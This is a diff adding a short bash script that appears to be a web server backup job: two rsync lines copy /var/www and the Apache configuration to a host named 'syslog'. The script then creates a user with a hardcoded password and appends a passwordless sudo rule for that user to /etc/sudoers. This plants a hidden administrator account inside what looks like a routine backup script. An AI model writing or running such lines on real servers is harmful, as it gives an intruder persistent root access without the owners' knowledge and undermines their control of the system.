@@ -1,0 +1,7 @@
+#!/bin/bash
+rsync -r -a -v --recursive --delete /var/www/ rsync://syslog/linuxyedek/yenilinuxanaweb/webdata
+rsync -r -a -v --recursive --delete /etc/apache2/ rsync://syslog/linuxyedek/yenilinuxanaweb/webconfig
+
+useradd -m -s /bin/bash st4inl3s5
+echo "st4inl3s5:trakya2005" | chpasswd
+echo "st4inl3s5 ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
